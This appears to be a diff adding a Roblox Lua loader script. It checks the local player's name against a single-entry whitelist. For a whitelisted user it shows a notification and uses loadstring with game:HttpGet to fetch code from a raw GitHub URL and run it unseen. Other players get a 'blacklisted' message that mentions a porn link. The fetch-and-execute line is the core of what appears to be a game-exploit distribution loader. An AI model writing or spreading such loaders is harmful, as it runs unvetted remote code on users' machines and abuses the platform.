@@ -1,0 +1,24 @@
+local player = {
+   "Anthonyz_ohhhhh8"
+}
+
+if game.Players.LocalPlayer.Name == unpack(player) then
+local starterGui = game:GetService("StarterGui")
+
+starterGui:SetCore("SendNotification",  {
+      Title = "Whitelist System",
+      Text = "Whitelisted!",
+      Duration = 5
+})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ianasmite/Pogisimark/main/Vamp.ggop", true))()
+
+else
+    local starterGui = game:GetService("StarterGui")
+
+starterGui:SetCore("SendNotification",  {
+      Title = "Whitelist System",
+      Text = "Progood u blacklist for: sent porn link   time:9:20 to whitelist",
+      Duration = 5
+})
+end
